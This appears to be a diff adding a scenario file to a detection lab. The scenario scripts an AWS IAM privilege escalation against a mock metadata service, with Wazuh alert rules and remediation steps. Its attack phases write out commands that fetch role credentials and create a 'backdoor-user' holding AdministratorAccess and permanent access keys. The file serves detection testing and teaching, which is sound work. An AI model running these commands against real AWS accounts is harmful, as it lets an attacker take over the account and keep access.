@@ -1,0 +1,166 @@
+{
+  "id": "S2-02",
+  "name": "Over-Permissioned IAM Role Exploitation",
+  "category": "Cloud Service Accounts",
+  "version": "1.0",
+  "description": "Abuse excessive permissions granted to an IAM role to escalate privileges",
+  "difficulty": "Medium",
+  "real_world_relevance": "Common cloud misconfiguration, AWS IAM privilege escalation",
+
+  "mitre_attack": {
+    "tactics": ["Privilege Escalation", "Persistence"],
+    "techniques": [
+      {"id": "T1078.004", "name": "Valid Accounts: Cloud Accounts"},
+      {"id": "T1098", "name": "Account Manipulation"}
+    ]
+  },
+
+  "prerequisites": {
+    "containers": ["cloud-workload", "mock-imds"],
+    "network": "cloud_net"
+  },
+
+  "attack_flow": {
+    "description": "Attacker discovers IAM role has excessive permissions and abuses them",
+    "diagram": [
+      "1. Attacker obtains IAM role credentials (via IMDS or other means)",
+      "2. Attacker enumerates permissions using iam:GetRolePolicy",
+      "3. Attacker discovers role can create new IAM users/roles",
+      "4. Attacker creates backdoor IAM user with admin access",
+      "5. Attacker achieves persistence via new credentials"
+    ]
+  },
+
+  "phases": [
+    {
+      "name": "Credential Acquisition",
+      "description": "Obtain IAM role credentials",
+      "actions": [
+        {
+          "type": "http_request",
+          "target": "http://172.41.0.100:1338/latest/meta-data/iam/security-credentials/demo-ec2-instance-role",
+          "method": "GET",
+          "expected_response_contains": ["AccessKeyId", "SecretAccessKey"]
+        }
+      ]
+    },
+    {
+      "name": "Permission Enumeration",
+      "description": "Discover what permissions the role has",
+      "actions": [
+        {
+          "type": "command",
+          "command": "aws iam get-role-policy --role-name demo-ec2-instance-role --policy-name AdminPolicy",
+          "expected_output_contains": ["iam:*", "ec2:*"]
+        },
+        {
+          "type": "command",
+          "command": "aws iam list-attached-role-policies --role-name demo-ec2-instance-role",
+          "description": "List managed policies attached to role"
+        }
+      ]
+    },
+    {
+      "name": "Privilege Escalation",
+      "description": "Abuse excessive permissions",
+      "critical": true,
+      "actions": [
+        {
+          "type": "command",
+          "command": "aws iam create-user --user-name backdoor-user",
+          "description": "Create backdoor IAM user"
+        },
+        {
+          "type": "command",
+          "command": "aws iam attach-user-policy --user-name backdoor-user --policy-arn arn:aws:iam::aws:policy/AdministratorAccess",
+          "description": "Attach admin policy to backdoor user"
+        },
+        {
+          "type": "command",
+          "command": "aws iam create-access-key --user-name backdoor-user",
+          "description": "Generate permanent credentials"
+        }
+      ]
+    }
+  ],
+
+  "indicators_of_compromise": [
+    {
+      "type": "CloudTrail",
+      "description": "iam:GetRolePolicy calls from EC2 instance",
+      "wazuh_rule": "100700"
+    },
+    {
+      "type": "CloudTrail",
+      "description": "iam:CreateUser or iam:CreateRole calls",
+      "wazuh_rule": "100701"
+    },
+    {
+      "type": "CloudTrail",
+      "description": "iam:AttachUserPolicy with AdministratorAccess",
+      "wazuh_rule": "100702"
+    }
+  ],
+
+  "expected_wazuh_alerts": [
+    {
+      "rule_id": "100700",
+      "level": 8,
+      "description": "NHI: IAM permission enumeration from service account"
+    },
+    {
+      "rule_id": "100701",
+      "level": 12,
+      "description": "NHI: IAM user/role creation from EC2 instance - PRIVILEGE ESCALATION"
+    },
+    {
+      "rule_id": "100702",
+      "level": 15,
+      "description": "NHI: AdministratorAccess policy attached - CRITICAL"
+    }
+  ],
+
+  "remediation": {
+    "immediate": [
+      "Delete unauthorized IAM users/roles",
+      "Revoke all sessions for compromised role",
+      "Review CloudTrail for all actions taken"
+    ],
+    "long_term": [
+      "Implement least privilege for all IAM roles",
+      "Use IAM Access Analyzer to identify excessive permissions",
+      "Enable AWS SCPs to prevent dangerous actions",
+      "Implement permission boundaries for roles"
+    ],
+    "aws_cli_commands": [
+      "# Review role policies",
+      "aws iam list-role-policies --role-name demo-ec2-instance-role",
+      "",
+      "# Check attached managed policies",
+      "aws iam list-attached-role-policies --role-name demo-ec2-instance-role",
+      "",
+      "# Apply permission boundary",
+      "aws iam put-role-permissions-boundary --role-name demo-ec2-instance-role --permissions-boundary arn:aws:iam::ACCOUNT:policy/BoundaryPolicy"
+    ]
+  },
+
+  "demo_script": {
+    "container": "cloud-workload",
+    "command": "/opt/nhi-demo/scripts/simulate-iam-escalation.sh"
+  },
+
+  "references": [
+    {
+      "title": "AWS IAM Best Practices",
+      "url": "https://docs.aws.amazon.com/IAM/latest/UserGuide/best-practices.html"
+    },
+    {
+      "title": "Rhino Security Labs - AWS Privilege Escalation",
+      "url": "https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/"
+    },
+    {
+      "title": "MITRE ATT&CK T1098",
+      "url": "https://attack.mitre.org/techniques/T1098/"
+    }
+  ]
+}
